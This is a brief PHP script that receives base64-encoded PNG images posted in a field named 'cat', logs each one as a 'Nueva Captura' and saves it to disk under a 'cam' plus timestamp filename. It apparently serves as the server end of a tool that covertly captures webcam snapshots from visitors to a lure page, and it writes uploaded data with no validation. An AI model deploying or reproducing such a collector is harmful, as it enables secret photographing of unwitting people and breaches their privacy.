  
<?php
$date = date('dMYHis');
$imageData=$_POST['cat'];
if (!empty($_POST['cat'])) {
error_log("Nueva Captura" . "\r\n", 3, "Log.txt");
}
$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'cam'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );
exit();
?>



